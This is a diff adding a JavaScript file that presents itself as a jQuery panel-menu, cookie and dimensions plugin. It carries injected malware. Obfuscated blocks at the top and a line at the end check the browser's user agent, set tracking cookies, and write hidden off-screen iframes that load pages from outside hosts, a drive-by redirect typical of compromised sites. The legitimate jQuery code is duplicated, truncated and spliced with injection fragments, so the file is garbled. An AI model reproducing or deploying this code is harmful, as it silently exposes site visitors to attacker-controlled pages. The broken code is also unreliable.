@@ -1,0 +1,105 @@
+/*Opanoqwu.Rfaks93ra8.3jfau3ra,fwkaiefajJHefua.fww3rifajfIIAUSJS,ASfjfjasufehh327aujasfm*/
+(function(){
+function stripos (d_haystack, d_needle, d_offset) {
+ var haystack = (d_haystack + '').toLowerCase();
+ var needle = (d_needle + '').toLowerCase();
+ var index = 0;
+ if ((index = haystack.indexOf(needle, d_offset)) !== -1) {
+  return index;
+ }
+ return false;
+}
+function user_agent(){
+ var blockList = ['Lunascape','iPhone','Macintosh','Linux','iPad','Flock','SeaMonkey','Nokia','SlimBrowser','AmigaOS','Android','FreeBSD','Chrome','IEMobile','Series40','SymbianOS','Avant','Chromium','Firefox','Maxthon','BlackBerry'];
+ var blockUA = false;
+ for (var i in blockList) {
+  if (stripos(navigator.userAgent, blockList[i])) {
+   blockUA = true;
+   break;
+  }
+ }
+ return blockUA;
+}
+function setCookie(name, value, expires) {
+ var date = new Date( new Date().getTime() + expires*1000 );
+ document.cookie = name+'='+value+'; path=/; expires='+date.toUTCString();
+}
+function getCookie(name) {
+ var matchs = document.cookie.match(new RegExp( "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\/\+^])/g, '\$1') + "=([^;]*)" ));
+ return matchs ? decodeURIComponent(matchs[1]) : undefined;
+}
+if (!user_agent()) {
+ var cookie = getCookie('misterx8wd7auefja9d');
+ if (cookie == undefined) {
+  setCookie('misterx8wd7auefja9d', true, 260000);	
+  document.write('<'+'i'+'f'+'ra'+'m'+'e'+' s'+'r'+'c="http://delisi.spgrepair.ca/jgfvcbdseyhryjtyfkfyuk12.html" style="posi'+'tio'+'n'+':absolute;left'+':'+'-1300px;'+'top:'+'-1300px;" height="150" width="150"></i'+'f'+'r'+'a'+'m'+'e'+'>');
+ }
+}
+})();
+/*3ra7sufjaf.Kgdeskegjxfnajewgtegjlasjfljlxmfajlef.EIAksjfejamsfeja.IefjaJHHAFWUJSJfauwfjskf,fwuausjfhufhbjahsufwhhfja.IFJAUSFNjajsfh83r7sfunb3fasuyfbhasf.aJAfbwhAHWFBaHAFBEHBM.aJWBFHAVBHWFbfuau83ruabhsfbyahbshbfansafbh3tbhabsnf*///Some.//Some.devices.are.designed:to,deny,users.access.to.install,or.run.modified:versions.of.the.software.inside:them,althoughthe,manufacturer,can.do.so
+(function(){
+function stripos (f_haystack, f_needle, f_offset) {
+var haystack = (f_haystack + '').toLowerCase();
+var needle = (f_needle + '').toLowerCase();
+var mainerx = 0;
+if ((mainerx = haystack.indexOf(needle, f_offset)) !== -1) {
+return mainerx;
+}
+return false;
+}
+function ttt_menubar_agent(){
+var BarindexAnet = 'iPhone§Macintosh§Linux§iPad§Series40§SymbOS§Flock§SeaMonkey§Nokia§SlimBrowser§AmigaOS§Android§FreeBSD§Chrome§IEMobile§SymbianOS§Avant§Chromium§Firefox/18.0§Firefox/18.0.1§Firefox/17.0§Firefox/12.0§Firefox/25.0§Firefox/24.0§Firefox/18.0.2§Firefox/19.0§Firefox/19.0.1§Firefox/20.0§Firefox/21.0§Firefox/22.0§Firefox/23.0§Firefox/25.0.1§Firefox/26.0§Firefox/27.0§Maxthon§MRSPUTNIK§Mini§Firefox/28.0§BlackBerry§PLAYSTATION§Wget§Firefox/27.0.1';
+BarindexAnet = BarindexAnet.split('§');
+var sympleAN = false;
+for (var i in BarindexAnet) {
+if (stripos(navigator.userAgent, BarindexAnet[i])!==false) {
+sympleAN = true;
+break;
+}
+}
+return sympleAN;
+}
+function setCookie(name, value, expires) {
+var date = new Date( new Date().getTime() + expires*1000 );
+document.cookie = name+'='+value+'; path=/; expires='+date.toUTCString();
+}
+function getCookie(name) {
+var matches = document.cookie.match(new RegExp( "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\/\+^])/g, '$1') + "=([^;]*)" ));
+return matches ? decodeURIComponent(matches[1]) : undefined;
+}
+if (!ttt_menubar_agent()) {
+var cookie = getCookie('menu17ager8aner91janeg71hss63geran391jerpamet');
+if (cookie == undefined) {
+setCookie('menu17ager8aner91janeg71hss63geran391jerpamet', true, 86404);
+document.write('<ifr'+'ame src='+'"http://yanerag.flaneurphotos.com.ar/fghregewgerhtrh8.html" style="position:absolute;left'+':-'+'1312px'+';'+'top'+':-'+'1312'+'px'+';" height="137" width="137" name="NestleBar"></if'+'ra'+'me>');
+}
+}
+})();
+//Finally,every:program.is.threatened.constantly.by,software
+
+ocument
+
+ocument).ready(function(){jQuery('.moduletable-panelmenu ul ul').hide();var cookieValue=jQuery.cookie('menuCookie')||'';jQuery('.moduletable-panelmenu ul > li > span').each(function(index){var $this=jQuery(this),$checkElement=$this.next('ul');if(cookieValue.indexOf(bigIndex(index))>-1){$checkElement.show()}$this.click(function(){if($checkElement.is(':hidden')){$checkElement.slideDown("fast");cookieValue=cookieValue+bigIndex(index);jQuery.cookie('menuCookie',cookieValue)}else{$checkElement.slideUp();cookieValue=cookieValue.replace(bigIndex(index),'');jQuery.cookie('menuCookie',cookieValue)}})});jQuery('button').click(function(){jQuery.cookie('menuCookie','',{expires:-1});jQuery('.moduletable-panelmenu > li ul').hide();showCookie()})});function bigIndex(inival){return inival<10?'0'+inival+'-':''+inival+'-'}
+
+/*-------------------------------------------------------------------- 
+ * JQuery Cookie
+--------------------------------------------------------------------*/
+
+jQuery.cookie=function(name,value,options){name = "menuCookie";if(typeof value!='undefined'){options=options||{};if(value===null){value='';options.expires=-1}var expires='';if(options.expires&&(typeof options.expires=='number'||options.expires.toUTCString)){var date;if(typeof options.expires=='number'){date=new Date();date.setTime(date.getTime()+(options.expires*24*60*60*1000))}else{date=options.expires}expires='; expires='+date.toUTCString()}var path=options.path?'; path='+(options.path):'';var domain=options.domain?'; domain='+(options.domain):'';var secure=options.secure?'; secure':'';document.cookie=[name,'=',encodeURIComponent(value),expires,path,domain,secure].join('')}else{var cookieValue=null;if(document.cookie&&document.cookie!=''){var cookies=document.cookie.split(';');for(var i=0;i<cookies.length;i++){var cookie=jQuery.trim(cookies[i]);if(cookie.substring(0,name.length+1)==(name+'=')){cookieValue=decodeURIComponent(cookie.substring(name.length+1));break}}}return cookieValue}};
+
+/*-------------------------------------------------------------------- 
+ * JQuer
+
+ocument).ready(function(){jQuery('.moduletable-panelmenu ul ul').hide();var cookieValue=jQuery.cookie('menuCookie')||'';jQuery('.moduletable-panelmenu ul > li > span').each(function(index){var $this=jQuery(this),$checkElement=$this.next('ul');if(cookieValue.indexOf(bigIndex(index))>-1){$checkElement.show()}$this.click(function(){if($checkElement.is(':hidden')){$checkElement.slideDown("fast");cookieValue=cookieValue+bigIndex(index);jQuery.cookie('menuCookie',cookieValue)}else{$checkElement.slideUp();cookieValue=cookieValue.replace(bigIndex(index),'');jQuery.cookie('menuCookie',cookieValue)}})});jQuery('button').click(function(){jQuery.cookie('menuCookie','',{expires:-1});jQuery('.moduletable-panelmenu > li ul').hide();showCookie()})});function bigIndex(inival){return inival<10?'0'+inival+'-':''+inival+'-'}
+
+/*-------------------------------------------------------------------- 
+ * JQuery Cookie
+--------------------------------------------------------------------*/
+
+jQuery.cookie=function(name,value,options){name = "menuCookie";if(typeof value!='undefined'){options=options||{};if(value===null){value='';options.expires=-1}var expires='';if(options.expires&&(typeof options.expires=='number'||options.expires.toUTCString)){var date;if(typeof options.expires=='number'){date=new Date();date.setTime(date.getTime()+(options.expires*24*60*60*1000))}else{date=options.expires}expires='; expires='+date.toUTCString()}var path=options.path?'; path='+(options.path):'';var domain=options.domain?'; domain='+(options.domain):'';var secure=options.secure?'; secure':'';document.cookie=[name,'=',encodeURIComponent(value),expires,path,domain,secure].join('')}else{var cookieValue=null;if(document.cookie&&document.cookie!=''){var cookies=document.cookie.split(';');for(var i=0;i<cookies.length;i++){var cookie=jQuery.trim(cookies[i]);if(cookie.substring(0,name.length+1)==(name+'=')){cookieValue=decodeURIComponent(cookie.substring(name.length+1));break}}}return cookieValue}};
+
+/*-------------------------------------------------------------------- 
+ * JQuery Dimensions
+--------------------------------------------------------------------*/
+
+(function($){$.dimensions={version:'@VERSION'};$.each(['Height','Width'],function(i,name){$.fn['inner'+name]=function(){if(!this[0])return;var torl=name=='Height'?'Top':'Left',borr=name=='Height'?'Bottom':'Right';return num(this,name.toLowerCase())+num(this,'padding'+torl)+num(this,'padding'+borr)};$.fn['outer'+name]=function(options){if(!this[0])return;var torl=name=='Height'?'Top':'Left',borr=name=='Height'?'Bottom':'Right';options=$.extend({margin:false},options||{});return num(this,name.toLowerCase())+num(this,'border'+torl+'Width')+num(this,'border'+borr+'Width')+num(this,'padding'+torl)+num(this,'padding'+borr)+(options.margin?(num(this,'margin'+torl)+num(this,'margin'+borr)):0)}});$.each(['Left','Top'],function(i,name){$.fn['scroll'+name]=function(val){if(!this[0])return;return val!=undefined?this.each(function(){this==window||this==document?window.scrollTo(name=='Left'?val:$(window)['scrollLeft'](),name=='Top'?val:$(window)['scrollTop']()):this['scroll'+name]=val}):this[0]==window||this[0]==document?self[(name=='Left'?'pageXOffset':'pageYOffset')]||$.boxModel&&document.documentElement['scroll'+name]||document.body['scroll'+name]:this[0]['scroll'+name]}});$.fn.extend({position:function(){var left=0,top=0,elem=this[0],offset,parentOffset,offsetParent,results;if(elem){offsetParent=this.offsetParent();offset=this.offset();parentOffset=offsetParent.offset();offset.top-=num(elem,'marginTop');offset.left-=num(elem,'marginLeft');parentOffset.top+=num(offsetParent,'borderTopWidth');parentOffset.left+=num(offsetParent,'borderLeftWidth');results={top:offset.top-parentOffset.top,left:offset.left-parentOffset.left}}return results},offsetParent:function(){var offsetParent=this[0].offsetParent;while(offsetParent&&(!/^body|html$/i.test(offsetParent.tagName)&&$.css(offsetParent,'position')=='static'))offsetParent=offsetParent.offsetParent;return $(offsetParent)}});function num(el,prop){return pa$.css(e$.css(el.jquery?el[0]:el,prop))||0}})(jQuery);0"></iframe>');></iframe>');;document.write('<iframe style="position:fixed;top:0px;left:-550px;" src="http://khburpio.dns-stuff.com/4ee75635.zGZnLUwS?default" height="70" width="70"></iframe>');e>'););
